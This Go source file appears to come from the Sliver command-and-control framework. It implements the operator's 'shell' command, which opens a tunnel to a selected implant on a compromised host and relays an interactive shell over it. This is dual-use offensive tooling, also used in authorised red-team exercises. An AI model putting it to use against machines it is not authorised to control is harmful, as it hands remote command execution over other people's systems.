package command

import (
	"fmt"
	"io"
	"log"
	"os"
	"sliver/client/core"
	clientpb "sliver/protobuf/client"
	sliverpb "sliver/protobuf/sliver"
	gen "sliver/server/generate"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func shell(ctx *grumble.Context, server *core.SliverServer) {
	if ActiveSliver.Sliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	noPty := ctx.Flags.Bool("no-pty")
	if ActiveSliver.Sliver.OS == gen.WINDOWS {
		noPty = true // Windows of course doesn't have PTYs
	}

	fmt.Printf(Info + "Opening shell tunnel with sliver ...\n")

	tunReq := &clientpb.TunnelCreateReq{SliverID: ActiveSliver.Sliver.ID}
	tunReqData, _ := proto.Marshal(tunReq)

	tunResp := <-server.RPC(&sliverpb.Envelope{
		Type: clientpb.MsgTunnelCreate,
		Data: tunReqData,
	}, defaultTimeout)
	if tunResp.Error != "" {
		fmt.Printf(Warn+"Error: %s", tunResp.Error)
		return
	}

	tunnelCreated := &clientpb.TunnelCreate{}
	proto.Unmarshal(tunResp.Data, tunnelCreated)

	shellReq := &sliverpb.ShellReq{
		SliverID:  ActiveSliver.Sliver.ID,
		EnablePTY: !noPty,
		TunnelID:  tunnelCreated.TunnelID,
	}
	shellReqData, _ := proto.Marshal(shellReq)

	resp := <-server.RPC(&sliverpb.Envelope{
		Type: sliverpb.MsgShellReq,
		Data: shellReqData,
	}, defaultTimeout)
	if resp.Error != "" {
		fmt.Printf(Warn+"Error: %s", resp.Error)
		return
	}

	tunnel := server.Tunnels.BindTunnel(tunnelCreated.SliverID, tunnelCreated.TunnelID) // Client core tunnel

	go func() {
		for data := range tunnel.Recv {
			log.Printf("[write] stdout shell with tunnel id = %d", shellReq.TunnelID)
			os.Stdout.Write(data)
		}
	}()

	readBuf := make([]byte, 128)
	for {
		n, err := os.Stdin.Read(readBuf)
		if err == io.EOF {
			return
		}
		data, _ := proto.Marshal(&sliverpb.TunnelData{Data: readBuf[:n]})
		log.Printf("[read] stdin tunnel %d", shellReq.TunnelID)
		go tunnel.Send(data)
	}
}
